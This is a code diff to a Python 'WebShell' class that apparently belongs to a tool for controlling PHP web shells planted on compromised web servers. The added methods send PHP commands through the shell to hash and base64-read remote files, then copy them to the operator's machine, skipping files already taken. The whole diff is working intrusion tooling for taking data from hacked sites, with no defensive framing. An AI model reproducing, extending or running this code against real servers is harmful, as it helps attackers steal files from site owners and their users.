@@ -5,6 +5,7 @@ from core.utils.string_utils.random_string import random_string
 from core.utils.string_utils.list2string import list2string
 from core.utils.http.build_url import build_url
 from core.utils.http.get_domain import get_domain
+from core.utils.hash.file import hash_file
 from core.log import Log
 
 import requests
@@ -352,8 +353,46 @@ class WebShell():
             Log.error("Some error occured when exec php code...")
             return False
 
-    def download(self, path, local_path):
-        Log.info("Downloading file : %s" % path)
+    def hash_remote_file(self, path):
+        result = self.php_code_exec_token("echo md5(file_get_contents('%s'));" % (path))
+        if result[0]:
+            content = result[1]
+            return content
+        else:
+            Log.error("Some error occured when exec php code...")
+            return ""
+
+    def download(self, remote_file_path, local_file_path):
+        root = get_domain(self.url)
+        path = root + local_file_path
+        Log.info("Local path : [%s]" % (path))
+        local_directory = path[0:-path[::-1].index("/")]
+        Log.info("Creating : [%s]" % (local_directory))
+        try:
+            os.makedirs(local_directory)
+        except Exception as e:
+            Log.error(str(e))
+        self.download_base(remote_file_path, path)
+
+
+    def download_base(self, path, local_path):
+        Log.info("Ready to downloading file : %s" % path)
+        Log.info("Detacting local file exists...")
+        exists = os.path.exists(local_path)
+        if exists:
+            Log.info("Checking remote file (%s) hash..." % (path))
+            remote_hash = self.hash_remote_file(path)
+            Log.info("Find md5 of remote file (%s) : %s" % (path, remote_hash))
+            Log.info("Checking local file (%s) hash..." % (local_path))
+            local_hash = hash_file(local_path)
+            Log.info("Find md5 of local file (%s) : %s" % (local_path, local_hash))
+            if remote_hash == local_hash:
+                Log.warning("File haved downloaded! Ignored!")
+                return
+            else:
+                Log.warning("File updated, downloading new version...")
+        else:
+            Log.error("Local file not exists...")
         result = self.php_code_exec_token('echo base64_encode(file_get_contents("%s"));' % (path))
         if result[0]:
             Log.success("Fetch data success! Start saving...")
@@ -387,7 +426,7 @@ class WebShell():
             for file in content:
                 p = root + file
                 Log.info("Downloading %s to %s" % (file, p))
-                self.download(file, p)
+                self.download_base(file, p)
         else:
             Log.error("Listing files error!")
 
